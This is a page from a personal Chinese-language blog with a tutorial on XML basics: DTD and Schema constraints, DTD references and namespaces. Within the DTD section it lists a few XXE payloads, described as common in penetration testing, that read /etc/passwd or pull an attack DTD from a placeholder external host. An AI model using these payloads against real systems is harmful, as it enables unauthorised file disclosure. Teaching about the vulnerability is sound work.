@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/uploads/xzpq.jpg?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="基础知识," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="XML基础XML是一种用于标记电子文件使其具有结构性的标记语言，用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。 xml 与html区别:     a.html主要用于显示数据,而xml是为了传输与存储数据的 b.html是不区分大小写的,而xml严格区分">
+<meta name="keywords" content="基础知识">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基础知识 | XML基础">
+<meta property="og:url" content="http://yoursite.com/2018/11/08/java_web_xml/index.html">
+<meta property="og:site_name" content="P0rZ9&#39;s blog">
+<meta property="og:description" content="XML基础XML是一种用于标记电子文件使其具有结构性的标记语言，用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。 xml 与html区别:     a.html主要用于显示数据,而xml是为了传输与存储数据的 b.html是不区分大小写的,而xml严格区分">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-05.14.32.24-image.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-05.15.45.34-image.png">
+<meta property="og:updated_time" content="2018-11-08T15:46:15.664Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="基础知识 | XML基础">
+<meta name="twitter:description" content="XML基础XML是一种用于标记电子文件使其具有结构性的标记语言，用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。 xml 与html区别:     a.html主要用于显示数据,而xml是为了传输与存储数据的 b.html是不区分大小写的,而xml严格区分">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-05.14.32.24-image.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2018/11/08/java_web_xml/"/>
+
+
+
+
+
+  <title>基础知识 | XML基础 | P0rZ9's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">P0rZ9's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/08/java_web_xml/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">基础知识 | XML基础</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-11-08T08:15:41+08:00">
+                2018-11-08
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<h2 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h2><p>XML是一种用于标记电子文件使其具有结构性的标记语言，用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
+<p>xml<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-05.14.32.24-image.png" alt="2018-11-05.14.32.24-image.png"></p>
+<p>与html区别:    </p>
+<pre><code>a.html主要用于显示数据,而xml是为了传输与存储数据的
+b.html是不区分大小写的,而xml严格区分大小写
+c.html有多个根元素,格式良好的xml只有一个根元素
+d.html的空格自动过滤,xml的空格不会自动删除
+e.html的标签是预定义的,而xml的标记可以根据需要自定义,且可扩展
+</code></pre><p>文档声明    </p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;    
+</code></pre><p>元素定义:<code>&lt;城市&gt;临汾&lt;/城市&gt;</code>就是文档中的标记,如果一个元素没有嵌套在其他元素内且没有包含内容,这样的元素称为空元素。</p>
+<p>属性定义:<code>&lt;售价 单位=&quot;元&quot;&gt;10&lt;/售价&gt;</code>,这里的单位即为属性,属性的命名规范与元素相同,属性值必须用”或’引起来,否则会报错<br>注释:与html的注释符一样<code>&lt;!--注释信息-- &gt;</code></p>
+<h3 id="DTD约束："><a href="#DTD约束：" class="headerlink" title="DTD约束："></a>DTD约束：</h3><p>dtd约束是早期出现的一种XML约束模式语言,根据其约束的语法创建的文件称为DTD文件。</p>
+<pre><code>xml文件:
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;!DOCTYPE 书架 SYSTEM &quot;test.dtd&quot;&gt;
+&lt;书架&gt;
+    &lt;书&gt;
+        &lt;书名&gt;java&lt;/书名&gt;
+        &lt;作者&gt;admin&lt;/作者&gt;
+        &lt;售价&gt;100&lt;/售价&gt;
+    &lt;/书&gt;
+&lt;/书架&gt;
+
+dtd文件:
+&lt;!ELEMENT 书架 (书+)&gt;
+&lt;!ELEMENT 书 (书名,作者,售价)&gt;
+&lt;!ELEMENT 书名 (#PCDATA)&gt;
+&lt;!ELEMENT 作者 (#PCDATA)&gt;
+&lt;!ELEMENT 售价 (#PCDATA)&gt;
+</code></pre><h4 id="DTD文件的引用"><a href="#DTD文件的引用" class="headerlink" title="DTD文件的引用"></a>DTD文件的引用</h4><p>a.引用本地<code>dtd</code>文件:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_11/2018-11-05.15.45.34-image.png" alt="2018-11-05.15.45.34-image.png"></p>
+<p>b.引用外部<code>dtd</code>文件:<br>&lt;!DOCTYPE a SYSTEM “<a href="http://www.xxx.cn/test.dtd&quot;&gt;" target="_blank" rel="noopener">http://www.xxx.cn/test.dtd&quot;&gt;</a></p>
+<p>c.内嵌DTD内容:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;&lt;!--standalone:是否依赖于外部文件--&gt;
+&lt;!DOCTYPE 书架 [
+    &lt;!ELEMENT 书架 (书+)&gt;
+    &lt;!ELEMENT 书 (书名,作者,售价)&gt;
+    &lt;!ELEMENT 书名 (#PCDATA)&gt;
+    &lt;!ELEMENT 作者 (#PCDATA)&gt;
+    &lt;!ELEMENT 售价 (#PCDATA)&gt;
+]&gt;
+&lt;书架&gt;
+    &lt;书&gt;
+        &lt;书名&gt;java&lt;/书名&gt;
+        &lt;作者&gt;admin&lt;/作者&gt;
+        &lt;售价&gt;100&lt;/售价&gt;
+    &lt;/书&gt;
+&lt;/书架&gt;
+</code></pre><p>在渗透过程中,xxe漏洞常利用的payload:</p>
+<pre><code>#读取etc/passwd文件:
+&lt;!DOCTYPE a [ &lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt; ]&gt;
+&lt;!DOCTYPE a [ &lt;!ENTITY % d SYSTEM &quot;http://www.xxx.cn/attack.dtd&quot;&gt; %d; ]&gt;
+&lt;!DOCTYPE a SYSTEM &quot;http://www.xxx.cn/attack.dtd&quot;&gt;
+
+DTD文件:
+&lt;!ENTITY b SYSTEM &quot;file:///etc/passwd&quot;&gt;
+</code></pre><h3 id="Schema约束"><a href="#Schema约束" class="headerlink" title="Schema约束"></a>Schema约束</h3><p>同DTD一样,XML Schema也是一种用于定义和描述XML文档结构与内容的模式语言。它克服了DTD的一些局限性。</p>
+<pre><code>a.DTD采用的是非XML语法格式,缺乏对文档元素,结构,数据类型的全面描述,而Schema本身采用的就是xml语法格式
+b.DTD本身合法性的验证采用的是另一套机制,而XML Schema则采用与XML文档相同的合法性验证机制
+c.支持命名空间,张三.书架 张三就为命名空间
+d.
+</code></pre><p>XML Schema:</p>
+<pre><code>定义可出现在文档中的元素
+定义可出现在文档中的属性
+定义哪个元素是子元素
+定义子元素的次序
+定义子元素的数目
+定义元素是否为空，或者是否可包含文本
+定义元素和属性的数据类型
+定义元素和属性的默认值以及固定值
+</code></pre><p>最简单的Schema文档:</p>
+<pre><code>#Simple.xsd
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;xs:schema xmlns:xs=&quot;http://w3.org/2001/XMLSchema&quot;&gt;
+    &lt;xs:element name=&quot;root&quot; type=&quot;xs:string&quot; /&gt;
+&lt;/xs:schema&gt;
+</code></pre><p><code>xs:schema</code>是根元素,表示模式定义的开始,由于<code>xs:schema</code>的属性都在<code>http://w3.org/2001/XMLSchema</code>的名称空间,因此,在根元素必须声明该名称空间.</p>
+<h4 id="名称空间"><a href="#名称空间" class="headerlink" title="名称空间:"></a>名称空间:</h4><p>举个简单例子便于理解:</p>
+<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;it315:书架 xmlns:it315=&quot;http://www.it315.org/xmlbook/schema&quot;&gt;
+    &lt;it315:书&gt;
+        &lt;it315:书名&gt;java&lt;/it315:书名&gt;
+        &lt;it315:作者&gt;admin&lt;/it315:作者&gt;
+        &lt;it315:售价&gt;28:00rmb&lt;/it315:售价&gt;
+    &lt;/it315:书&gt;
+&lt;/it315:书架&gt;
+</code></pre><p>名称空间的应用就是将前缀(<code>it315</code>)与一个<code>URI(http://www.it315.org/xmlbook/schema)</code>关联起来</p>
+<h4 id="引入Schema文档"><a href="#引入Schema文档" class="headerlink" title="引入Schema文档"></a>引入Schema文档</h4><p>若想通过XML Schema文件对某个xml文件进行约束时,必须将XML文档与Schema文件进行关联。在xml文档引入Schema文件有使用名称空间及不使用名称空间2种方法.</p>
+<pre><code>#使用空间名称
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;书架 xmls=&quot;http://www.it315.org/xmlbook/schema&quot;   //引入xmls
+      xmls:demo=&quot;http://www.it315.org/demo/schema&quot; //引入xmls下的demo
+      xmls:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  //引入xmls下的xsi
+      xsi:schemaLocation=&quot;http://www.it315.org/xmlbook/schema   //xsi名称空间名
+                          http://www.it315.org/xmlbook.xsd        //文档位置
+                          http://www.it315.org/demo/schema        //demo名称空间名
+                          http://www.it315.org/demo.xsd&quot;&gt;        //文档位置
+      &lt;书&gt;
+        &lt;书名&gt;java&lt;/书名&gt;
+        &lt;作者&gt;admin&lt;/作者&gt;
+        &lt;售价 demo:币种=&quot;人民币&quot;&gt;11&lt;/售价&gt;
+      &lt;/书&gt;
+
+&lt;/书架&gt;
+
+
+#不使用空间名称 xmlbook.xsd与test.xml位于同一目录中
+test.xml
+&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+&lt;书架 xmls:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+      xsi:noNamespaceSchemaLocation=&quot;xmlbook.xsd&quot;&gt;
+      &lt;书&gt;
+        &lt;书名&gt;java&lt;/书名&gt;
+        &lt;作者&gt;admin&lt;/作者&gt;
+        &lt;售价&gt;11&lt;/售价&gt;
+      &lt;/书&gt;
+
+&lt;/书架&gt;
+</code></pre><p>更多元素与语法参考:<a href="http://www.w3school.com.cn/schema/schema_elements_ref.asp" target="_blank" rel="noopener">XML Schema 参考手册</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/基础知识/" rel="tag"># 基础知识</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/07/java_web_前端基础/" rel="next" title="基础知识 | 前端基础知识">
+                <i class="fa fa-chevron-left"></i> 基础知识 | 前端基础知识
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">P0rZ9</p>
+              <p class="site-description motion-element" itemprop="description">找回当年那个被寄予厚望的自己</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">40</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#XML基础"><span class="nav-number">1.</span> <span class="nav-text">XML基础</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#DTD约束："><span class="nav-number">1.1.</span> <span class="nav-text">DTD约束：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#DTD文件的引用"><span class="nav-number">1.1.1.</span> <span class="nav-text">DTD文件的引用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Schema约束"><span class="nav-number">1.2.</span> <span class="nav-text">Schema约束</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#名称空间"><span class="nav-number">1.2.1.</span> <span class="nav-text">名称空间:</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#引入Schema文档"><span class="nav-number">1.2.2.</span> <span class="nav-text">引入Schema文档</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">P0rZ9</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
